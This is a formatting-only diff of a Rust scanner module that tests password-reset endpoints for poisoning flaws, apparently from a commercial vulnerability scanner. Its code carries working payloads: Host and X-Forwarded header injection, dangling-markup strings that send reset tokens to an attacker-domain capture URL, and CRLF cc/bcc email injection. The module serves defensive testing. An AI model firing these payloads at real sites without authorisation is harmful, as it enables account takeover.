@@ -77,7 +77,9 @@ impl PasswordResetPoisoningScanner {
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // License check
         if !crate::license::verify_scan_authorized() {
-            return Err(anyhow::anyhow!("Scan not authorized. Please check your license."));
+            return Err(anyhow::anyhow!(
+                "Scan not authorized. Please check your license."
+            ));
         }
 
         info!("[PasswordResetPoisoning] Starting comprehensive password reset security scan");
@@ -94,7 +96,10 @@ impl PasswordResetPoisoningScanner {
             return Ok((Vec::new(), total_tests));
         }
 
-        info!("[PasswordResetPoisoning] Found {} password reset endpoints", endpoints.len());
+        info!(
+            "[PasswordResetPoisoning] Found {} password reset endpoints",
+            endpoints.len()
+        );
 
         // Phase 2: Test each endpoint
         for endpoint in &endpoints {
@@ -169,12 +174,18 @@ impl PasswordResetPoisoningScanner {
             ("/auth/forgot-password", ResetEndpointType::ForgotPassword),
             // API endpoints
             ("/api/auth/forgot", ResetEndpointType::ForgotPassword),
-            ("/api/auth/forgot-password", ResetEndpointType::ForgotPassword),
+            (
+                "/api/auth/forgot-password",
+                ResetEndpointType::ForgotPassword,
+            ),
             ("/api/password/forgot", ResetEndpointType::ForgotPassword),
             ("/api/v1/auth/forgot", ResetEndpointType::ForgotPassword),
             ("/api/v1/password/forgot", ResetEndpointType::ForgotPassword),
             ("/api/v1/forgot-password", ResetEndpointType::ForgotPassword),
-            ("/api/users/forgot-password", ResetEndpointType::ForgotPassword),
+            (
+                "/api/users/forgot-password",
+                ResetEndpointType::ForgotPassword,
+            ),
             // Reset password
             ("/reset-password", ResetEndpointType::ResetPassword),
             ("/reset_password", ResetEndpointType::ResetPassword),
@@ -247,7 +258,12 @@ impl PasswordResetPoisoningScanner {
 
         // Also check main page for forms
         if let Ok(response) = self.http_client.get(base_url).await {
-            self.extract_reset_forms(&response.body, base_url, &mut endpoints, &mut discovered_urls);
+            self.extract_reset_forms(
+                &response.body,
+                base_url,
+                &mut endpoints,
+                &mut discovered_urls,
+            );
         }
 
         endpoints
@@ -300,9 +316,8 @@ impl PasswordResetPoisoningScanner {
         let html_lower = html.to_lowercase();
 
         // Look for forms with password reset indicators
-        let form_pattern = Regex::new(
-            r#"<form[^>]*action=["']([^"']+)["'][^>]*>([\s\S]*?)</form>"#
-        );
+        let form_pattern =
+            Regex::new(r#"<form[^>]*action=["']([^"']+)["'][^>]*>([\s\S]*?)</form>"#);
 
         if let Ok(re) = form_pattern {
             for cap in re.captures_iter(&html_lower) {
@@ -350,7 +365,10 @@ impl PasswordResetPoisoningScanner {
     }
 
     /// Test Host header injection
-    async fn test_host_header_injection(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
+    async fn test_host_header_injection(
+        &self,
+        endpoint: &ResetEndpoint,
+    ) -> (Vec<Vulnerability>, usize) {
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
 
@@ -360,7 +378,10 @@ impl PasswordResetPoisoningScanner {
         let host_payloads = vec![
             (self.attacker_domain.clone(), "direct_injection"),
             (format!("{}:443", self.attacker_domain), "port_manipulation"),
-            (format!("{}:80@legitimate.com", self.attacker_domain), "at_sign_bypass"),
+            (
+                format!("{}:80@legitimate.com", self.attacker_domain),
+                "at_sign_bypass",
+            ),
         ];
 
         let test_email = "prp-test@bountyy-scanner.invalid";
@@ -371,7 +392,11 @@ impl PasswordResetPoisoningScanner {
             let body = if endpoint.is_api {
                 format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
             } else {
-                format!("{}={}", endpoint.email_param, urlencoding::encode(test_email))
+                format!(
+                    "{}={}",
+                    endpoint.email_param,
+                    urlencoding::encode(test_email)
+                )
             };
 
             let content_type = if endpoint.is_api {
@@ -385,11 +410,18 @@ impl PasswordResetPoisoningScanner {
                 ("Content-Type".to_string(), content_type.to_string()),
             ];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     // Check if attacker domain appears in response
                     if response.body.contains(&self.attacker_domain) {
-                        info!("[PasswordResetPoisoning] Host header injection detected via {}", technique);
+                        info!(
+                            "[PasswordResetPoisoning] Host header injection detected via {}",
+                            technique
+                        );
                         vulnerabilities.push(self.create_vulnerability(
                             &endpoint.url,
                             &format!("Host: {}", host_value),
@@ -438,7 +470,10 @@ impl PasswordResetPoisoningScanner {
     }
 
     /// Test X-Forwarded-* header injection
-    async fn test_forwarded_headers(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
+    async fn test_forwarded_headers(
+        &self,
+        endpoint: &ResetEndpoint,
+    ) -> (Vec<Vulnerability>, usize) {
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
 
@@ -470,7 +505,11 @@ impl PasswordResetPoisoningScanner {
             let body = if endpoint.is_api {
                 format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
             } else {
-                format!("{}={}", endpoint.email_param, urlencoding::encode(test_email))
+                format!(
+                    "{}={}",
+                    endpoint.email_param,
+                    urlencoding::encode(test_email)
+                )
             };
 
             let content_type = if endpoint.is_api {
@@ -484,10 +523,17 @@ impl PasswordResetPoisoningScanner {
                 ("Content-Type".to_string(), content_type.to_string()),
             ];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     if response.body.contains(&self.attacker_domain) {
-                        info!("[PasswordResetPoisoning] {} injection detected", header_name);
+                        info!(
+                            "[PasswordResetPoisoning] {} injection detected",
+                            header_name
+                        );
                         vulnerabilities.push(self.create_vulnerability(
                             &endpoint.url,
                             &format!("{}: {}", header_name, header_value),
@@ -552,23 +598,38 @@ impl PasswordResetPoisoningScanner {
         // Dangling markup payloads to capture token
         let dangling_payloads = vec![
             (
-                format!("victim@example.com<img src=\"http://{}/capture?token=", self.attacker_domain),
+                format!(
+                    "victim@example.com<img src=\"http://{}/capture?token=",
+                    self.attacker_domain
+                ),
                 "img_src_dangling",
             ),
             (
-                format!("victim@example.com'><img src=http://{}/", self.attacker_domain),
+                format!(
+                    "victim@example.com'><img src=http://{}/",
+                    self.attacker_domain
+                ),
                 "attr_escape_img",
             ),
             (
-                format!("victim@example.com\"><a href=\"http://{}/", self.attacker_domain),
+                format!(
+                    "victim@example.com\"><a href=\"http://{}/",
+                    self.attacker_domain
+                ),
                 "attr_escape_anchor",
             ),
             (
-                format!("victim@example.com<base href=\"http://{}/\">", self.attacker_domain),
+                format!(
+                    "victim@example.com<base href=\"http://{}/\">",
+                    self.attacker_domain
+                ),
                 "base_tag_injection",
             ),
             (
-                format!("victim@example.com<style>@import url('http://{}/", self.attacker_domain),
+                format!(
+                    "victim@example.com<style>@import url('http://{}/",
+                    self.attacker_domain
+                ),
                 "css_import_dangling",
             ),
         ];
@@ -577,7 +638,11 @@ impl PasswordResetPoisoningScanner {
             tests_run += 1;
 
             let body = if endpoint.is_api {
-                format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, payload.replace('"', "\\\""))
+                format!(
+                    r#"{{"{}":"{}"}}"#,
+                    endpoint.email_param,
+                    payload.replace('"', "\\\"")
+                )
             } else {
                 format!("{}={}", endpoint.email_param, urlencoding::encode(payload))
             };
@@ -588,15 +653,20 @@ impl PasswordResetPoisoningScanner {
                 "application/x-www-form-urlencoded"
             };
 
-            let headers = vec![
-                ("Content-Type".to_string(), content_type.to_string()),
-            ];
+            let headers = vec![("Content-Type".to_string(), content_type.to_string())];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     // Check if our payload appears in response (reflected)
                     if response.body.contains(&self.attacker_domain) {
-                        info!("[PasswordResetPoisoning] Dangling markup injection detected via {}", technique);
+                        info!(
+                            "[PasswordResetPoisoning] Dangling markup injection detected via {}",
+                            technique
+                        );
                         vulnerabilities.push(self.create_vulnerability(
                             &endpoint.url,
                             payload,
@@ -653,7 +723,10 @@ impl PasswordResetPoisoningScanner {
     }
 
     /// Test email parameter manipulation
-    async fn test_email_manipulation(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
+    async fn test_email_manipulation(
+        &self,
+        endpoint: &ResetEndpoint,
+    ) -> (Vec<Vulnerability>, usize) {
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
 
@@ -666,45 +739,69 @@ impl PasswordResetPoisoningScanner {
         let manipulation_payloads = vec![
             // Array parameter injection
             (
-                format!("{}[]={}&{}[]={}", endpoint.email_param, victim_email, endpoint.email_param, attacker_email),
+                format!(
+                    "{}[]={}&{}[]={}",
+                    endpoint.email_param, victim_email, endpoint.email_param, attacker_email
+                ),
                 "array_injection",
                 "Array parameter injection - both emails may receive reset link",
             ),
             // Carbon copy injection
             (
-                format!("{}={}%0acc:{}", endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    "{}={}%0acc:{}",
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "cc_injection_lf",
                 "CC header injection via LF - attacker gets copy of reset email",
             ),
             (
-                format!("{}={}%0d%0acc:{}", endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    "{}={}%0d%0acc:{}",
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "cc_injection_crlf",
                 "CC header injection via CRLF",
             ),
             (
-                format!("{}={}%0abcc:{}", endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    "{}={}%0abcc:{}",
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "bcc_injection",
                 "BCC header injection - attacker gets hidden copy",
             ),
             // Separator injection
             (
-                format!("{}={},{}", endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    "{}={},{}",
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "comma_separator",
                 "Comma-separated emails - both may receive reset",
             ),
             (
-                format!("{}={};{}", endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    "{}={};{}",
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "semicolon_separator",
                 "Semicolon-separated emails",
             ),
             (
-                format!("{}={} {}", endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    "{}={} {}",
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "space_separator",
                 "Space-separated emails",
             ),
             // JSON array (for API endpoints)
             (
-                format!(r#"{{"{}":["{}", "{}"]}}"#, endpoint.email_param, victim_email, attacker_email),
+                format!(
+                    r#"{{"{}":["{}", "{}"]}}"#,
+                    endpoint.email_param, victim_email, attacker_email
+                ),
                 "json_array",
                 "JSON array of emails",
             ),
@@ -730,11 +827,13 @@ impl PasswordResetPoisoningScanner {
                 continue;
             };
 
-            let headers = vec![
-                ("Content-Type".to_string(), content_type.to_string()),
-            ];
+            let headers = vec![("Content-Type".to_string(), content_type.to_string())];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     let body_lower = response.body.to_lowercase();
 
@@ -752,7 +851,10 @@ impl PasswordResetPoisoningScanner {
                         || body_lower.contains("multiple emails");
 
                     if accepted && !rejected {
-                        info!("[PasswordResetPoisoning] Email manipulation accepted via {}", technique);
+                        info!(
+                            "[PasswordResetPoisoning] Email manipulation accepted via {}",
+                            technique
+                        );
                         vulnerabilities.push(self.create_vulnerability(
                             &endpoint.url,
                             payload,
@@ -813,7 +915,11 @@ impl PasswordResetPoisoningScanner {
             let body = if endpoint.is_api {
                 format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
             } else {
-                format!("{}={}", endpoint.email_param, urlencoding::encode(&test_email))
+                format!(
+                    "{}={}",
+                    endpoint.email_param,
+                    urlencoding::encode(&test_email)
+                )
             };
 
             let content_type = if endpoint.is_api {
@@ -822,11 +928,13 @@ impl PasswordResetPoisoningScanner {
                 "application/x-www-form-urlencoded"
             };
 
-            let headers = vec![
-                ("Content-Type".to_string(), content_type.to_string()),
-            ];
+            let headers = vec![("Content-Type".to_string(), content_type.to_string())];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     // Try to extract token from response
                     if let Some(token) = self.extract_token(&response.body) {
@@ -845,7 +953,8 @@ impl PasswordResetPoisoningScanner {
         // Analyze collected tokens
         if !tokens.is_empty() {
             // Check entropy
-            let avg_entropy: f64 = tokens.iter().map(|t| t.entropy_bits).sum::<f64>() / tokens.len() as f64;
+            let avg_entropy: f64 =
+                tokens.iter().map(|t| t.entropy_bits).sum::<f64>() / tokens.len() as f64;
 
             if avg_entropy < 128.0 {
                 vulnerabilities.push(self.create_vulnerability(
@@ -853,7 +962,11 @@ impl PasswordResetPoisoningScanner {
                     &format!("Average entropy: {:.1} bits", avg_entropy),
                     "low_entropy_token",
                     "Weak Password Reset Token (Low Entropy)",
-                    if avg_entropy < 64.0 { Severity::Critical } else { Severity::High },
+                    if avg_entropy < 64.0 {
+                        Severity::Critical
+                    } else {
+                        Severity::High
+                    },
                     Confidence::High,
                     &format!(
                         "Password reset tokens have insufficient entropy ({:.1} bits). \
@@ -1067,7 +1180,11 @@ impl PasswordResetPoisoningScanner {
             let body = if endpoint.is_api {
                 format!(r#"{{"{}":"{}"}}"#, endpoint.email_param, test_email)
             } else {
-                format!("{}={}", endpoint.email_param, urlencoding::encode(&test_email))
+                format!(
+                    "{}={}",
+                    endpoint.email_param,
+                    urlencoding::encode(&test_email)
+                )
             };
 
             let content_type = if endpoint.is_api {
@@ -1076,11 +1193,13 @@ impl PasswordResetPoisoningScanner {
                 "application/x-www-form-urlencoded"
             };
 
-            let headers = vec![
-                ("Content-Type".to_string(), content_type.to_string()),
-            ];
+            let headers = vec![("Content-Type".to_string(), content_type.to_string())];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     if response.status_code == 429
                         || response.body.to_lowercase().contains("rate limit")
@@ -1104,7 +1223,10 @@ impl PasswordResetPoisoningScanner {
         if !rate_limited && successful_requests >= 3 {
             vulnerabilities.push(self.create_vulnerability(
                 &endpoint.url,
-                &format!("{} requests sent, {} successful, no rate limiting", tests_run, successful_requests),
+                &format!(
+                    "{} requests sent, {} successful, no rate limiting",
+                    tests_run, successful_requests
+                ),
                 "no_rate_limiting",
                 "Missing Rate Limiting on Password Reset",
                 Severity::Medium,
@@ -1123,7 +1245,10 @@ impl PasswordResetPoisoningScanner {
     }
 
     /// Test username enumeration
-    async fn test_username_enumeration(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
+    async fn test_username_enumeration(
+        &self,
+        endpoint: &ResetEndpoint,
+    ) -> (Vec<Vulnerability>, usize) {
         let mut vulnerabilities = Vec::new();
         let tests_run = 2;
 
@@ -1131,7 +1256,10 @@ impl PasswordResetPoisoningScanner {
 
         // Request 1: Valid-looking email
         let valid_email = "existing.user@company.test";
-        let invalid_email = format!("nonexistent-{}@invalid-domain-xyz.test", Self::generate_id());
+        let invalid_email = format!(
+            "nonexistent-{}@invalid-domain-xyz.test",
+            Self::generate_id()
+        );
 
         let mut responses: Vec<(String, u16, usize)> = Vec::new();
 
@@ -1148,11 +1276,13 @@ impl PasswordResetPoisoningScanner {
                 "application/x-www-form-urlencoded"
             };
 
-            let headers = vec![
-                ("Content-Type".to_string(), content_type.to_string()),
-            ];
+            let headers = vec![("Content-Type".to_string(), content_type.to_string())];
 
-            match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+            match self
+                .http_client
+                .post_with_headers(&endpoint.url, &body, headers)
+                .await
+            {
                 Ok(response) => {
                     responses.push((
                         response.body.to_lowercase(),
@@ -1173,7 +1303,8 @@ impl PasswordResetPoisoningScanner {
             let length_differs = (*len1 as i64 - *len2 as i64).abs() > 20;
 
             // Check for different messages
-            let msg_differs = (body1.contains("user not found") && !body2.contains("user not found"))
+            let msg_differs = (body1.contains("user not found")
+                && !body2.contains("user not found"))
                 || (body1.contains("no account") && !body2.contains("no account"))
                 || (body1.contains("doesn't exist") && !body2.contains("doesn't exist"))
                 || (body1.contains("email sent") && !body2.contains("email sent"))
@@ -1214,7 +1345,10 @@ impl PasswordResetPoisoningScanner {
     }
 
     /// Test password change security
-    async fn test_password_change_security(&self, endpoint: &ResetEndpoint) -> (Vec<Vulnerability>, usize) {
+    async fn test_password_change_security(
+        &self,
+        endpoint: &ResetEndpoint,
+    ) -> (Vec<Vulnerability>, usize) {
         let mut vulnerabilities = Vec::new();
         let tests_run = 1;
 
@@ -1233,11 +1367,13 @@ impl PasswordResetPoisoningScanner {
             "application/x-www-form-urlencoded"
         };
 
-        let headers = vec![
-            ("Content-Type".to_string(), content_type.to_string()),
-        ];
+        let headers = vec![("Content-Type".to_string(), content_type.to_string())];
 
-        match self.http_client.post_with_headers(&endpoint.url, &body, headers).await {
+        match self
+            .http_client
+            .post_with_headers(&endpoint.url, &body, headers)
+            .await
+        {
             Ok(response) => {
                 let body_lower = response.body.to_lowercase();
 
@@ -1316,7 +1452,11 @@ impl PasswordResetPoisoningScanner {
             }
         }
 
-        format!("{}/{}", base_url.trim_end_matches('/'), path.trim_start_matches('/'))
+        format!(
+            "{}/{}",
+            base_url.trim_end_matches('/'),
+            path.trim_start_matches('/')
+        )
     }
 
     /// Create vulnerability report
@@ -1368,7 +1508,7 @@ impl PasswordResetPoisoningScanner {
             false_positive: false,
             remediation: self.get_remediation(technique),
             discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
+            ml_data: None,
         }
     }
 
